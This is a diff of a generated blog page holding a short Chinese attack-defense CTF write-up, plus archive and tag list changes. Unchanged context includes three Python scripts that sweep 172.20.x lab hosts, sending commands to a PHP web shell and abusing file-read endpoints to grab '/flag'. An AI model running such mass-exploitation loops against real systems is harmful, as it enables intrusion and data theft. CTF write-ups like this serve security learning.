@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">505</span> / Reading time: <span class="post-count">2 min</span></span>
+                        <span>Word count: <span class="post-count">518</span> / Reading time: <span class="post-count">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -407,7 +407,7 @@ height:50vh;
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>, <span class="number">160</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        res = requests.post(<span class="string">'http://172.20.'</span> + str(i) + <span class="string">'.101/config/config.php'</span>,</span><br><span class="line">                            data=&#123;<span class="string">'cmd'</span>: <span class="string">"echo file_get_contents('/flag');"</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">'172.20.'</span> + str(i) + <span class="string">'.101'</span>)</span><br><span class="line">            <span class="comment"># print(len(res.text))</span></span><br><span class="line">            print(res.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        res = requests.get(<span class="string">'http://172.20.'</span> + str(i) +</span><br><span class="line">                           <span class="string">'.101/?c=index&amp;a=show_pic&amp;file=/flag'</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> (len(res.text) &lt; <span class="number">100</span>):</span><br><span class="line">                print(<span class="string">'172.20.'</span> + str(i) + <span class="string">'.101'</span>)</span><br><span class="line">                <span class="comment"># print(len(res.text))</span></span><br><span class="line">                print(res.content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        res = requests.get(<span class="string">'http://172.20.'</span> + str(i) +</span><br><span class="line">                           <span class="string">'.102/WEB/pages/iteminfo/doinserin.php?action=delete&amp;usr_id=/flag'</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> (len(res.text) &gt; <span class="number">0</span>):</span><br><span class="line">                print(<span class="string">'172.20.'</span> + str(i) + <span class="string">'.102'</span>)</span><br><span class="line">                <span class="comment"># print(len(res.text))</span></span><br><span class="line">                print(res.content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure>
-<p>然后下午渗透emmm 就找到了简单的几个flag，然后还有一个内网的题目没进去，需要外网做跳板不知道是什么操作emmmm</p>
+<p>然后下午渗透emmm 就找到了简单的几个flag，然后还有一个内网的题目没进去，需要外网做跳板不知道是什么操作emmmm(后来才知道需要先把外网getshell…Orz)</p>
 <p>msf还不熟练,tcl,要学习…</p>
 
     </article>
@@ -1038,9 +1038,52 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 35
+        Total : 36
         </div>
         <!-- search  -->
         
@@ -1062,6 +1105,11 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/2018/10/09/面试/" >Web安全知识整理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span><a class="archive-post-title" href= "/2018/10/03/markdown语法总结/" >Markdown语法总结</a>
         </li>
     
     
@@ -1156,12 +1204,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/sql注入总结/" >SQL注入总结</a>
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/java环境配置/" >java环境配置及版本共存问题</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/java环境配置/" >java环境配置及版本共存问题</a>
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/sql注入总结/" >SQL注入总结</a>
         </li>
     
     
@@ -1215,29 +1263,6 @@ top:50vh;
         </li>
     
     
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/09/11/blog/" >搭博客的经历</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
-    
-    
         <li class="archive-post-item">
             <span class="archive-post-date">05/16</span><a class="archive-post-title" href= "/2018/05/16/problem/" >日常学习中问题</a>
         </li>
@@ -1245,6 +1270,11 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2018/03/24/2018-QWB/" >2018 QWB 题目整理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/14</span><a class="archive-post-title" href= "/2018/02/14/blog/" >搭博客的经历</a>
         </li>
     
     </div>
@@ -1256,15 +1286,15 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="CTF、漏洞"><span class="iconfont-archer">&#xe606;</span>CTF、漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
-    
         <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="Record,Problem"><span class="iconfont-archer">&#xe606;</span>Record,Problem</span>
     
-        <span class="sidebar-tag-name" data-tags="problem"><span class="iconfont-archer">&#xe606;</span>problem</span>
-    
         <span class="sidebar-tag-name" data-tags="漏洞、CTF"><span class="iconfont-archer">&#xe606;</span>漏洞、CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="problem"><span class="iconfont-archer">&#xe606;</span>problem</span>
     
         <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
     
